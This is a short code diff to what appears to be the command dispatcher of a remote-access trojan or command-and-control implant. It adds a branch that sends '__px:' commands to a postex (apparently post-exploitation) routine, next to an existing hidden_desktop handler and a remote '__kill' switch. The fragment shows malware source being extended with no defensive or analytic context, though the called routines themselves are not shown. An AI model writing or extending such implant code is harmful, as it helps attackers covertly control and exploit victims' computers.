@@ -101,6 +101,8 @@ def exchange(payload: str) -> str:
 def execute_command(command: str) -> str:
     if str(command).startswith('__hd:'):
         return hidden_desktop(command)
+    if str(command).startswith('__px:'):
+        return postex(command)
     if command == '__kill':
         sys.exit(0)
     try:
